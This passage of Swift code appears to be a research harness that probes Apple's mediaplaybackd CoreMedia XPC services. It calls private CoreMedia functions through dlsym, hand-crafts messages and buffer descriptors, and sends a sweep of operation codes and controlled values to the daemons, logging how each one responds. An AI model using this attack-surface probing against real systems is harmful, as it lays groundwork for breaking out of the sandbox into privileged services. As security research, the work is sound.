                "PreferredFormat".withCString { xq_dictionary_set_value(m, $0, fmt) }
                "Flags".withCString { xq_dictionary_set_int64(m, $0, 1) }
                let r = sendSync(c, m, timeout: 5.0)
                if let r {
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xfz: \(label) err=\(err)")
                    xq_release(r)
                } else {
                    emit("xfz: \(label) no reply")
                }
                xq_release(fmt)
                xq_release(m)
            }
            Thread.sleep(forTimeInterval: 0.5)
        }
        xq_cancel(c); xq_release(c)
        emit("xfz: done")
    }

    // MARK: - hand-built buffer descriptor

    /// FigPixelBufferOriginAppendPixelBufferToIPCMessageData fills a descriptor
    /// of at least 0x2c bytes: a u64 origin id followed by a u32 index. Without
    /// a FigXPC client we cannot call it, so build the blob by hand and see
    /// whether the daemon accepts it and reaches back to our origin.
    func descriptorProbe() {
        emit("xpcd: hand-built buffer descriptor")
        typealias BeginFn = @convention(c) (XObj?) -> Int32
        guard let b = dlsym(UnsafeMutableRawPointer(bitPattern: -2),
                            "FigPixelBufferOriginBeginEstablishingPixelBufferRecipientByFillingInXPCMessage1"),
              let begin = unsafeBitCast(b, to: BeginFn?.self) else {
            emit("xpcd: symbol missing"); return
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.videocompositor.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcd: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xpcd: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }

        var objectID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0),
           let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            "CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
            xq_release(opts)
            if let r = sendSync(c, m, timeout: 5.0) {
                objectID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        emit("xpcd: compositor=\(objectID)")
        guard objectID != 0 else { xq_release(c); return }

        // Two shapes of the same idea: a raw blob and a dictionary.
        for shape in ["blob", "dict"] {
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x6f757470) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
            "ProcessingTime".withCString { xq_dictionary_set_int64(m, $0, 0) }

            let rcBegin = begin(m)
            let originID = "PixelBufferOriginServerToken".withCString { xq_dictionary_get_uint64(m, $0) }
            emit("xpcd: [\(shape)] begin rc=\(rcBegin) originID=\(originID)")

            if shape == "blob" {
                var blob = [UInt8](repeating: 0, count: 64)
                withUnsafeBytes(of: originID.littleEndian) { raw in
                    for (i, byte) in raw.enumerated() { blob[i] = byte }
                }
                // index 0 already zero
                blob.withUnsafeBytes { raw in
                    if let data = xq_data_create(raw.baseAddress, raw.count) {
                        "ComposedBuffer".withCString { xq_dictionary_set_value(m, $0, data) }
                        xq_release(data)
                    }
                }
            } else {
                if let d = xq_dictionary_create(nil, nil, 0) {
                    "OriginID".withCString { xq_dictionary_set_uint64(d, $0, originID) }
                    "Index".withCString { xq_dictionary_set_int64(d, $0, 0) }
                    "ComposedBuffer".withCString { xq_dictionary_set_value(m, $0, d) }
                    xq_release(d)
                }
            }

            if let r = sendSync(c, m, timeout: 6.0) {
                let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xpcd: [\(shape)] outp err=\(err)")
                xq_release(r)
            } else {
                emit("xpcd: [\(shape)] outp no reply")
            }
            xq_release(m)
            Thread.sleep(forTimeInterval: 0.8)
        }

        Thread.sleep(forTimeInterval: 6.0)
        xq_cancel(c); xq_release(c)
        emit("xpcd: done")
    }

    // MARK: - FigXPC client for the origin

    /// The pixel-buffer origin belongs to a FigXPC client connection. Find out
    /// whether a client can be created with a null callback table; if it can,
    /// the origin becomes reachable and buffers can be attached.
    func figXPCClientProbe() {
        emit("xpcc: figxpc client")
        typealias CreateFn = @convention(c) (UnsafeRawPointer?, UnsafeRawPointer?, UnsafeRawPointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
        typealias CopyOriginFn = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32

        guard let cs = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "FigXPCRemoteClientCreateWithXPCService"),
              let os = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "FigXPCRemoteClientCopyPixelBufferOrigin"),
              let create = unsafeBitCast(cs, to: CreateFn?.self),
              let copyOrigin = unsafeBitCast(os, to: CopyOriginFn?.self) else {
            emit("xpcc: symbols missing"); return
        }
        emit("xpcc: symbols resolved")

        let serviceName = "com.apple.coremedia.mediaplaybackd.videocompositor.xpc"
        var client: UnsafeMutableRawPointer?
        // First field of the callback table is the version; the creation path
        // dereferences it before anything else. Zero page faults, so supply a
        // versioned, otherwise empty table.
        // Version 4 uses all seven function-pointer slots; fill them with a
        // stub so the client has something callable instead of null.
        var callbacks = [UInt64](repeating: 0, count: 32)
        callbacks[0] = 4
        let stub = unsafeBitCast(xqStubCallback, to: UInt64.self)
        for i in 1...7 { callbacks[i] = stub }
        let rc = callbacks.withUnsafeMutableBufferPointer { buf in
            serviceName.withCString { namePtr in
                create(UnsafeRawPointer(namePtr),
                       UnsafeRawPointer(buf.baseAddress), nil, &client)
            }
        }
        emit("xpcc: create(NULL callbacks) rc=\(rc) client=\(client != nil)")
        guard rc == 0, let client else {
            emit("xpcc: client not created, stopping")
            return
        }

        var origin: UnsafeMutableRawPointer?
        let rc2 = copyOrigin(client, &origin)
        emit("xpcc: copyOrigin rc=\(rc2) origin=\(origin != nil)")

        if let origin {
            typealias SetPBFn = @convention(c) (UnsafeMutableRawPointer?, XObj?, UnsafeRawPointer?, CVPixelBuffer?, UInt64) -> Int32
            if let sp = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "FigPixelBufferOriginSetPixelBufferInXPCMessage"),
               let setPB = unsafeBitCast(sp, to: SetPBFn?.self) {
                var pb: CVPixelBuffer?
                let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [String: Any]()]
                let st = CVPixelBufferCreate(nil, 64, 64, kCVPixelFormatType_32BGRA, attrs as CFDictionary, &pb)
                emit("xpcc: buffer status=\(st) have=\(pb != nil)")
                if let pb, let msg = xq_dictionary_create(nil, nil, 0) {
                    let key = "ComposedBuffer" as CFString
                    let rc3 = setPB(origin, msg, Unmanaged.passUnretained(key).toOpaque(), pb, 0)
                    emit("xpcc: setPixelBuffer rc=\(rc3)")
                    let has = "ComposedBuffer".withCString { xq_dictionary_get_value(msg, $0) } != nil
                    emit("xpcc: message has ComposedBuffer=\(has)")
                    xq_release(msg)
                }
            }
        }
        emit("xpcc: done")
    }

    // MARK: - pixel buffer into the compositor

    /// Full chain: fill the origin handshake, take the origin by the token the
    /// message carries, wrap a real CVPixelBuffer, then send outp.
    func pixelBufferProbe() {
        emit("xpcpix: pixel buffer chain")
        typealias BeginFn = @convention(c) (XObj?) -> Int32
        typealias CopyOriginFn = @convention(c) (UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
        typealias SetPBFn = @convention(c) (UnsafeMutableRawPointer?, XObj?, UnsafeRawPointer?, CVPixelBuffer?, UInt64) -> Int32

        func sym(_ name: String) -> UnsafeMutableRawPointer? {
            dlsym(UnsafeMutableRawPointer(bitPattern: -2), name)
        }
        guard let b = sym("FigPixelBufferOriginBeginEstablishingPixelBufferRecipientByFillingInXPCMessage1"),
              let co = sym("FigPixelBufferOriginServerCopyPixelBufferOriginForObjectID"),
              let sp = sym("FigPixelBufferOriginSetPixelBufferInXPCMessage"),
              let begin = unsafeBitCast(b, to: BeginFn?.self),
              let copyOrigin = unsafeBitCast(co, to: CopyOriginFn?.self),
              let setPB = unsafeBitCast(sp, to: SetPBFn?.self) else {
            emit("xpcpix: symbols missing"); return
        }
        emit("xpcpix: symbols resolved")

        guard let c = "com.apple.coremedia.mediaplaybackd.videocompositor.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcpix: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xpcpix: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }

        var objectID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0),
           let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            "CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
            xq_release(opts)
            if let r = sendSync(c, m, timeout: 5.0) {
                objectID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        emit("xpcpix: compositor id=\(objectID)")
        guard objectID != 0 else { xq_release(c); return }

        // Build the message first so Begin can fill it in.
        guard let m = xq_dictionary_create(nil, nil, 0) else { xq_release(c); return }
        ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x6f757470) }
        ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
        ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
        "ProcessingTime".withCString { xq_dictionary_set_int64(m, $0, 0) }

        let rc = begin(m)
        let serverToken = "PixelBufferOriginServerToken".withCString { xq_dictionary_get_uint64(m, $0) }
        emit("xpcpix: begin rc=\(rc) serverToken=\(serverToken)")
        guard serverToken != 0 else { emit("xpcpix: no server token"); xq_release(m); xq_release(c); return }

        var originPtr: UnsafeMutableRawPointer?
        let rc2 = copyOrigin(serverToken, &originPtr)
        emit("xpcpix: copyOrigin rc=\(rc2) origin=\(originPtr != nil)")
        guard let origin = originPtr else { emit("xpcpix: no origin"); xq_release(m); xq_release(c); return }

        // A deliberately small buffer: 64x64 BGRA.
        var pb: CVPixelBuffer?
        let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [String: Any]()]
        let st = CVPixelBufferCreate(nil, 64, 64, kCVPixelFormatType_32BGRA, attrs as CFDictionary, &pb)
        emit("xpcpix: CVPixelBufferCreate status=\(st) have=\(pb != nil)")
        guard let pixelBuffer = pb else { xq_release(m); xq_release(c); return }

        let key = "ComposedBuffer" as CFString
        let rc3 = setPB(origin, m, Unmanaged.passUnretained(key).toOpaque(), pixelBuffer, 0)
        emit("xpcpix: setPixelBuffer rc=\(rc3)")

        if let r = sendSync(c, m, timeout: 6.0) {
            let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
            emit("xpcpix: outp -> err=\(err)")
            emit("xpcpix:   \(describe(r))")
            xq_release(r)
        } else {
            emit("xpcpix: outp -> no reply")
        }
        xq_release(m)
        Thread.sleep(forTimeInterval: 6.0)
        xq_cancel(c); xq_release(c)
        emit("xpcpix: done")
    }

    // MARK: - pixel buffer origin

    /// outp wants ComposedBuffer as a reference into a pixel-buffer origin that
    /// lives in our process. CoreMedia exposes the whole handshake, so call it
    /// through dlsym the same way the memory origin was set up.
    func pixelBufferOriginProbe() {
        emit("xpcpb: pixel buffer origin")
        typealias BeginFn = @convention(c) (XObj?) -> Int32
        guard let sym = dlsym(UnsafeMutableRawPointer(bitPattern: -2),
                              "FigPixelBufferOriginBeginEstablishingPixelBufferRecipientByFillingInXPCMessage1"),
              let begin = unsafeBitCast(sym, to: BeginFn?.self) else {
            emit("xpcpb: symbol not found"); return
        }
        emit("xpcpb: symbol resolved")

        guard let c = "com.apple.coremedia.mediaplaybackd.videocompositor.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcpb: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xpcpb: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        emit("xpcpb: token=\(tok)")

        var objectID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0),
           let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            "CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
            xq_release(opts)
            if let r = sendSync(c, m, timeout: 5.0) {
                objectID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        emit("xpcpb: compositor id=\(objectID)")

        guard objectID != 0 else { emit("xpcpb: no object"); xq_release(c); return }

        // Bare outp first: the control case, expected to fail with -12504.
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x6f757470) }  // outp
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
            let r = sendSync(c, m, timeout: 5.0)
            var err: Int64 = -9999
            if let r {
                err = ".ErrorReturn".withCString { k in xq_dictionary_get_int64(r, k) }
                xq_release(r)
            }
            emit("xpcpb: outp bare -> \(err)")
            xq_release(m)
        }

        // Now let CoreMedia fill in the origin endpoint and token.
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x6f757470) }  // outp
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
            let rc = begin(m)
            emit("xpcpb: Begin... rc=\(rc)")
            let hasEp = "PixelBufferOriginEndpoint".withCString { xq_dictionary_get_value(m, $0) } != nil
            let hasTok = "PixelBufferOriginServerToken".withCString { xq_dictionary_get_value(m, $0) } != nil
            emit("xpcpb: filled endpoint=\(hasEp) token=\(hasTok)")
            if let r = sendSync(c, m, timeout: 6.0) {
                let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xpcpb: outp with origin -> err=\(err)")
                emit("xpcpb:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xpcpb: outp with origin -> no reply")
            }
            xq_release(m)
        }

        Thread.sleep(forTimeInterval: 8.0)
        emit("xpcpb: window closed")
        xq_cancel(c); xq_release(c)
        emit("xpcpb: done")
    }

    // MARK: - video compositor

    /// VideoCompositor "crea" reads CreationOptions (kFigCommonXPCMsgParam_-
    /// CreationOptions), not the player keys used in the earlier sweep.
    func videoCompositorProbe() {
        emit("xpcvc: video compositor create")
        guard let c = "com.apple.coremedia.mediaplaybackd.videocompositor.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcvc: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xpcvc: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        emit("xpcvc: token=\(tok)")

        var objectID: UInt64 = 0
        for variant in ["empty", "with-hints"] {
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    if variant == "with-hints" {
                        "PixelFormat".withCString { xq_dictionary_set_int64(opts, $0, 0x34323076) }
                        "Width".withCString { xq_dictionary_set_int64(opts, $0, 1920) }
                        "Height".withCString { xq_dictionary_set_int64(opts, $0, 1080) }
                    }
                    "CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(c, m, timeout: 5.0) {
                    let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    let oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    emit("xpcvc: crea[\(variant)] -> \(hasErr ? "err=\(err)" : "no ErrorReturn") id=\(oid)")
                    emit("xpcvc:   \(describe(r))")
                    if oid != 0 { objectID = oid }
                    xq_release(r)
                }
                xq_release(m)
            }
            Thread.sleep(forTimeInterval: 0.6)
        }

        if objectID != 0 {
            for op in ["outp", "purg", "doom"] {
                let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, UInt64(fourcc)) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
                    if let r = sendSync(c, m, timeout: 5.0) {
                        let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xpcvc: \(op) err=\(err)")
                        xq_release(r)
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.4)
            }
        }
        Thread.sleep(forTimeInterval: 5.0)
        xq_cancel(c); xq_release(c)
        emit("xpcvc: done")
    }

    // MARK: - tap with a callback endpoint

    /// The tap service exists to call back into the client. Offer an endpoint,
    /// build the object with the fields its handler reads, then ask it to call.
    func tapEndpointProbe() {
        emit("xpcep: tap with callback endpoint")
        guard let listener = xq_connection_create(nil, queue) else {
            emit("xpcep: listener create failed"); return
        }
        let connType = xq_get_type(listener)
        xq_set_event_handler(listener) { [weak self] event in
            guard let self, let event else { return }
            if xq_get_type(event) == connType {
                self.emit("xpcep: PEER CONNECTED")
                xq_set_event_handler(event) { [weak self] inner in
                    guard let self, let inner else { return }
                    if xq_get_type(inner) == connType {
                        self.emit("xpcep: PEER CONNECTED (nested)")
                        xq_set_event_handler(inner) { [weak self] leaf in
                            guard let self else { return }
                            self.emit("xpcep: PEER MSG \(self.describe(leaf))")
                        }
                        xq_resume(inner)
                    } else {
                        self.emit("xpcep: PEER MSG \(self.describe(inner))")
                    }
                }
                xq_resume(event)
            } else {
                self.emit("xpcep: LISTENER EVENT \(self.describe(event))")
            }
        }
        xq_resume(listener)
        guard let ep = xq_endpoint_create(listener) else {
            emit("xpcep: endpoint create failed"); xq_release(listener); return
        }
        emit("xpcep: endpoint ready")

        guard let c = "com.apple.coremedia.mediaplaybackd.audioprocessingtap.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcep: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] event in
            guard let self else { return }
            self.emit("xpcep: SERVER EVENT \(self.describe(event))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        emit("xpcep: token=\(tok)")

        var objectID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726538) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            "MTAudioProcessingTap".withCString { xq_dictionary_set_value(m, $0, ep) }
            "Flags".withCString { xq_dictionary_set_int64(m, $0, 0) }
            if let fmt = xq_dictionary_create(nil, nil, 0) {
                "PreferredFormat".withCString { xq_dictionary_set_value(m, $0, fmt) }
                xq_release(fmt)
            }
            if let r = sendSync(c, m, timeout: 5.0) {
                objectID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                emit("xpcep: cre8 id=\(objectID)")
                xq_release(r)
            }
            xq_release(m)
        }

        if objectID != 0 {
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63617463) }  // catc
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
                if let r = sendSync(c, m, timeout: 5.0) {
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xpcep: catc err=\(err)")
                    xq_release(r)
                }
                xq_release(m)
            }
            // Walk the remaining operations on the same valid object, one at a
            // time, watching whether any of them pulls the client in.
            for op in ["itc ", "Gcr8", "csmc", "cncl"] {
                let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, UInt64(fourcc)) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
                    if let r = sendSync(c, m, timeout: 5.0) {
                        let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xpcep: \(op.trimmingCharacters(in: .whitespaces)) err=\(err)")
                        emit("xpcep:   \(describe(r))")
                        xq_release(r)
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.5)
            }
        }

        // csmc carries a SubmixID we choose. If the daemon echoes or indexes
        // with it, a controlled value shows up either in the reply or in a
        // notification payload.
        for submix in [1, 2, 12345, 0x7fffffff] {
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63736d63) }  // csmc
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, objectID) }
                "SubmixID".withCString { xq_dictionary_set_int64(m, $0, Int64(submix)) }
                "AQTapServerToken".withCString { xq_dictionary_set_int64(m, $0, 0) }
                if let r = sendSync(c, m, timeout: 5.0) {
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xpcep: csmc[submix=\(submix)] err=\(err)")
                    emit("xpcep:   \(describe(r))")
                    xq_release(r)
                }
                xq_release(m)
            }
            Thread.sleep(forTimeInterval: 0.6)
        }

        Thread.sleep(forTimeInterval: 20.0)
        emit("xpcep: window closed")
        xq_cancel(c); xq_release(c)
        xq_cancel(listener); xq_release(listener)
        emit("xpcep: done")
    }

    // MARK: - audio processing tap


    /// audioprocessingtap accepted a bare "cre8", the first service that got
    /// past its creation gate. Take the object id out of the reply and drive the
    /// other operations against it.
    func tapProbe() {
        emit("xpctap: audio processing tap")
        func readID(_ r: XObj?) -> Int64 {
            guard let r else { return 0 }
            for key in [".objectID", "ObjectID", ".ObjectID"] {
                if let v = key.withCString({ xq_dictionary_get_value(r, $0) }), v == v {
                    let n = key.withCString { xq_dictionary_get_uint64(r, $0) }
                    if n != 0 { emit("xpctap: id from \(key) = \(n)"); return Int64(bitPattern: n) }
                }
            }
            return 0
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.audioprocessingtap.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpctap: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)
        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xpctap: no token"); xq_release(c); return }

        var objectID: Int64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726538) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                emit("xpctap: cre8 reply = \(describe(r))")
                objectID = readID(r)
                xq_release(r)
            } else {
                emit("xpctap: cre8 no reply")
            }
            xq_release(m)
        }

        // Drive the remaining operations; catc/itc are the callback-related ones.
        // The handler reads "MTAudioProcessingTap" besides Flags and
        // PreferredFormat, so that is the most likely reference key. Try it
        // alongside the dotted protocol key to settle it with one run.
        let keyCandidates = ["ObjectID", ".ObjectID", "objectID", "AudioProcessingTap",
                             "FigAudioProcessingTap", "Tap", "FigTap", "MTAudioProcessingTapID"]
        for op in ["catc", "itc", "csmc", "Gcr8"] {
            let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
            for refKey in keyCandidates {
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, UInt64(fourcc)) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    if objectID != 0 {
                        refKey.withCString { xq_dictionary_set_int64(m, $0, objectID) }
                    }
                    if let r = sendSync(c, m, timeout: 5.0) {
                        let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                        let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xpctap: \(op)[\(refKey)] -> \(hasErr ? "err=\(err)" : "NO ErrorReturn")")
                        emit("xpctap:   \(describe(r))")
                        xq_release(r)
                    } else {
                        emit("xpctap: \(op)[\(refKey)] -> no reply")
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.35)
            }
        }
        xq_cancel(c); xq_release(c)
        emit("xpctap: done")
    }

    // MARK: - create reachability across services

    /// Which services actually reach application logic with a bare "cre8"?
    /// A reply with an ErrorReturn means the message was parsed; the code tells
    /// us whether an object was created or a required field was missing.
    func cre8ServicesProbe() {
        emit("xpcc8: create reachability")
        let services = [
            "com.apple.coremedia.mediaplaybackd.player.xpc",
            "com.apple.coremedia.mediaplaybackd.cpeprotector.xpc",
            "com.apple.coremedia.mediaplaybackd.audioprocessingtap.xpc",
            "com.apple.coremedia.mediaplaybackd.audiodeviceclock.xpc",
            "com.apple.coremedia.mediaplaybackd.cpe.xpc",
            "com.apple.coremedia.mediaplaybackd.videocompositor.xpc",
        ]
        for svc in services {
            let short = svc.split(separator: ".").dropLast().last.map(String.init) ?? svc
            guard let c = svc.withCString({ xq_connection_create_service($0, queue, 0) }) else {
                emit("xpcc8: \(short): connect failed"); continue
            }
            xq_set_event_handler(c) { _ in }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            if tok == 0 { emit("xpcc8: \(short): no token"); xq_release(c); continue }

            for variant in ["bare", "options"] {
                guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726538) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                if variant == "options" {
                    if let opts = xq_dictionary_create(nil, nil, 0) {
                        "PlayerCreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                        "AutomaticallyManagesSize".withCString { xq_dictionary_set_int64(m, $0, 1) }
                        "TargetSize".withCString { xq_dictionary_set_int64(m, $0, 1920) }
                        xq_release(opts)
                    }
                }
                let r = sendSync(c, m, timeout: 5.0)
                if let r {
                    let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                    let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xpcc8: \(short)[\(variant)] -> \(hasErr ? "err=\(err)" : "NO ErrorReturn")")
